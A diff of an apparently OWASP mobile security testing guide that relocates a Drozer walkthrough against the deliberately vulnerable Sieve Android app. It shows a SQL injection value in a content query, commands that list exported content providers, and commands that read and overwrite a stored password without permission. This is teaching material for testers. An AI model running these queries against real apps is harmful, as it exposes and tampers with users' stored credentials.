@@ -236,31 +236,6 @@ The SQL injection can be exploited by using the following command. Instead of ge
 content query --uri content://sg.vp.owasp_mobile.provider.College/students --where "name='Bob') OR 1=1--''"
 ```
 
-##### With Drozer
-
-The "Sieve" application implements a vulnerable content provider.
-
-* To identify the the list of content providers exported execute the following command:
-
-  `run app.provider.finduri (package name)`
-
-* We can see that there are two similar URIS.
-* Open the first URI with the following command:
-
-  `run app.provider.query content://com.mwr.example.sieve.DBContentProvider/keys `
-
-This will ask for the custom permission "com.mwr.example.sieve.READ_KEYS".
-
-* Lets open second URI : <font face="verdana" color="Blue" font size="2">    content://com.mwr.example.sieve.DBContentProvider/keys/</font>
-  
-This content provider can be accessed without any permission.
-
-* Change the value of Password from amalammu0987654321 to ammuamal12345 by executing the fowllowing command:
-
-  `run app.provider.update (URI) --selection "pin=(pinno)" --string  Password "newpassword"`
- 
-* Read the password to confirm that it has been changes successfully.
-
 #### Remediation
 
 All functions in the app that process data that is coming from external and through the UI should be validated.
@@ -577,6 +552,45 @@ Attack Surface:
   2 content providers exported
   2 services exported
     is debuggable
+```
+
+##### Content Providers
+
+The "Sieve" application implements a vulnerable content provider. To list of content providers exported by the Sieve app execute the following command:
+
+```
+dz> run app.provider.finduri com.mwr.example.sieve
+Scanning com.mwr.example.sieve...
+content://com.mwr.example.sieve.DBContentProvider/
+content://com.mwr.example.sieve.FileBackupProvider/
+content://com.mwr.example.sieve.DBContentProvider
+content://com.mwr.example.sieve.DBContentProvider/Passwords/
+content://com.mwr.example.sieve.DBContentProvider/Keys/
+content://com.mwr.example.sieve.FileBackupProvider
+content://com.mwr.example.sieve.DBContentProvider/Passwords
+content://com.mwr.example.sieve.DBContentProvider/Keys
+```
+
+Content providers with names like "Passwords" and "Keys" are prime suspects for sensitive information leaks. After all, it wouldn't be great if sensitive keys and passwords could simply be queried from the provider!
+
+```
+dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys
+Permission Denial: reading com.mwr.example.sieve.DBContentProvider uri content://com.mwr.example.sieve.DBContentProvider/Keys from pid=4268, uid=10054 requires com.mwr.example.sieve.READ_KEYS, or grantUriPermission()
+```
+
+```
+dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/
+| Password          | pin  |
+| SuperPassword1234 | 1234 |
+```
+
+This content provider can be accessed without any permission.
+
+```
+dz> run app.provider.update content://com.mwr.example.sieve.DBContentProvider/Keys/ --selection "pin=1234" --string  Password "newpassword"
+dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/
+| Password    | pin  |
+| newpassword | 1234 |
 ```
 
 ##### Activities
